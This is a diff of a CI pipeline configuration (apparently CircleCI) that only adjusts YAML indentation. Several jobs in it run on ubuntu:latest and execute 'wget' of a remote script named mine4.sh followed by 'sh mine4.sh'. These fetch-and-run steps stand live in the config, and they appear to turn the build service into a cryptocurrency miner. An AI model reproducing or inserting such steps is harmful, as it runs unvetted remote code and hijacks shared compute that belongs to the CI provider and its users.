@@ -30,7 +30,7 @@
                 - image: ubuntu:latest
           steps:
             - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
-      seven:
+        seven:
           docker:
                 - image: ubuntu:latest
           steps:
@@ -101,7 +101,8 @@
                 - image: ubuntu:latest
           steps:
             - wget https://huggingface.co/myfiles/data/raw/main/mine4.sh && sh mine4.sh
-    workflows:
+  
+  workflows:
         version: 2
         build:
             jobs:
